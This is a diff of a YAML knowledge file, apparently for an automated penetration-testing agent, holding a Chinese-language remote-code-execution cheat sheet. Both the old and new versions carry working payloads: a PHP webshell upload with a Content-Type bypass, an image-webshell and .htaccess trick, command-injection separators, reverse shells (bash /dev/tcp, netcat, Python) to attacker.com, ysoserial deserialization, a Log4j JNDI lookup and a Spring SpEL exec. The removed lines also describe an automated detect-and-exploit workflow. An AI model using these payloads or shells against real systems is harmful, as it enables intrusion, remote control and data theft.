@@ -1,152 +1,22 @@
-name: "远程代码执行"
-description: "命令注入、代码执行漏洞利用技术"
-domain: "web"
-version: "1.0"
+name: 远程代码执行
+description: 命令注入、代码执行漏洞利用技术
+domain: web
+version: '1.0'
 tags:
-  - web
-  - rce
-  - command-injection
-
-knowledge: |
-  # RCE攻击链
-  
-  ## 文件上传 → WebShell
-  
-  ### 1. 基础上穿
-  
-  ```
-  1. 上传.php文件
-     Content-Disposition: form-data; name="file"; filename="shell.php"
-     <?php system($_GET['cmd']); ?>
-  
-  2. 绕过Content-Type
-     Content-Type: image/jpeg
-  
-  3. 访问Shell
-     http://target/uploads/shell.php?cmd=whoami
-  ```
-  
-  ### 2. 图片马利用
-  
-  ```bash
-  # 生成图片马
-  copy 1.jpg /b + shell.php /b shell.jpg
-  
-  # 上传后包含
-  ?page=upload/shell.jpg
-  ```
-  
-  ### 3. .htaccess利用
-  
-  ```
-  # 上传.htaccess
-  AddType application/x-httpd-php .jpg
-  <FilesMatch "jpg">
-  SetHandler application/x-httpd-php
-  </FilesMatch>
-  
-  # 上传shell.jpg
-  ```
-  
-  ---
-  
-  ## 命令注入 → 反弹Shell
-  
-  ### 1. 基础测试
-  
-  ```
-  ; whoami
-  | id
-  & whoami
-  ```
-  
-  ### 2. 反弹Shell
-  
-  ```bash
-  # Bash
-  bash -i >& /dev/tcp/attacker.com/4444 0>&1
-  
-  # Netcat
-  nc -e /bin/sh attacker.com 4444
-  
-  # Python
-  python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("attacker",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);subprocess.call(["/bin/sh","-i"])'
-  ```
-  
-  ### 3. 写入WebShell
-  
-  ```
-  ; echo '<?php system($_GET["cmd"]);?>' > /var/www/html/shell.php
-  ```
-  
-  ---
-  
-  ## 反序列化 → RCE
-  
-  ### PHP反序列化
-  
-  ```
-  # 生成Payload
-  php -r 'echo serialize(new User("admin","cmd"));'
-  
-  # 触发
-   unserialize($_POST['data'])
-  ```
-  
-  ### Java反序列化
-  
-  ```
-  # 使用ysoserial
-  java -jar ysoserial.jar CommonsCollections1 "command" > payload.ser
-  ```
-  
-  ---
-  
-  ## 框架漏洞 → RCE
-  
-  ### Log4j
-  
-  ```
-  ${jndi:ldap://attacker.com/Exploit}
-  ```
-  
-  ### Spring SpEL
-  
-  ```
-  ${T(java.lang.Runtime).getRuntime().exec('id')}
-  ```
-  
-  ---
-  
-  ## 攻击链速查
-  
-  | 阶段 | 方法 | 关键步骤 |
-  |------|------|----------|
-  | 获取入口 | 文件上传/命令注入/反序列化 | 绕过过滤 |
-  | 反弹Shell | Bash/Netcat/Python | 目标有出网能力 |
-  | 写WebShell | 文件写入 | 获取路径 |
-  
-
-workflows:
-  - name: "自动检测和利用"
-    description: "自动检测漏洞并尝试利用"
-    steps:
-      - description: "信息收集和漏洞探测"
-        expected_output: "发现潜在漏洞点"
-      - description: "漏洞验证"
-        expected_output: "确认漏洞存在"
-      - description: "漏洞利用"
-        expected_output: "成功利用漏洞"
-
-tool_preferences:
-  nmap:
-    score: 0.8
-    reason: "端口和服务扫描"
-  nuclei:
-    score: 0.9
-    reason: "漏洞扫描"
-
-examples:
-  - scenario: "发现漏洞并获取敏感信息"
-    solution: "使用工具探测 -> 验证漏洞 -> 获取数据"
-    tools_used: ["nmap", "nuclei"]
+- web
+- rce
+- command-injection
+knowledge: "# RCE攻击链\n\n## 文件上传 → WebShell\n\n### 1. 基础上穿\n\n```\n1. 上传.php文件\n   Content-Disposition: form-data; name=\"\
+  file\"; filename=\"shell.php\"\n   <?php system($_GET['cmd']); ?>\n\n2. 绕过Content-Type\n   Content-Type: image/jpeg\n\n\
+  3. 访问Shell\n   http://target/uploads/shell.php?cmd=whoami\n```\n\n### 2. 图片马利用\n\n```bash\n# 生成图片马\ncopy 1.jpg /b + shell.php\
+  \ /b shell.jpg\n\n# 上传后包含\n?page=upload/shell.jpg\n```\n\n### 3. .htaccess利用\n\n```\n# 上传.htaccess\nAddType application/x-httpd-php\
+  \ .jpg\n<FilesMatch \"jpg\">\nSetHandler application/x-httpd-php\n</FilesMatch>\n\n# 上传shell.jpg\n```\n\n---\n\n## 命令注入\
+  \ → 反弹Shell\n\n### 1. 基础测试\n\n```\n; whoami\n| id\n& whoami\n```\n\n### 2. 反弹Shell\n\n```bash\n# Bash\nbash -i >& /dev/tcp/attacker.com/4444\
+  \ 0>&1\n\n# Netcat\nnc -e /bin/sh attacker.com 4444\n\n# Python\npython -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"\
+  attacker\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);subprocess.call([\"/bin/sh\",\"-i\"])'\n```\n\n### 3. 写入WebShell\n\
+  \n```\n; echo '<?php system($_GET[\"cmd\"]);?>' > /var/www/html/shell.php\n```\n\n---\n\n## 反序列化 → RCE\n\n### PHP反序列化\n\n\
+  ```\n# 生成Payload\nphp -r 'echo serialize(new User(\"admin\",\"cmd\"));'\n\n# 触发\n unserialize($_POST['data'])\n```\n\n###\
+  \ Java反序列化\n\n```\n# 使用ysoserial\njava -jar ysoserial.jar CommonsCollections1 \"command\" > payload.ser\n```\n\n---\n\n\
+  ## 框架漏洞 → RCE\n\n### Log4j\n\n```\n${jndi:ldap://attacker.com/Exploit}\n```\n\n### Spring SpEL\n\n```\n${T(java.lang.Runtime).getRuntime().exec('id')}\n\
+  ```\n\n---\n\n## 攻击链速查\n\n| 阶段 | 方法 | 关键步骤 |\n|------|------|----------|\n| 获取入口 | 文件上传/命令注入/反序列化 | 绕过过滤 |\n| 反弹Shell |\
+  \ Bash/Netcat/Python | 目标有出网能力 |\n| 写WebShell | 文件写入 | 获取路径 |\n"
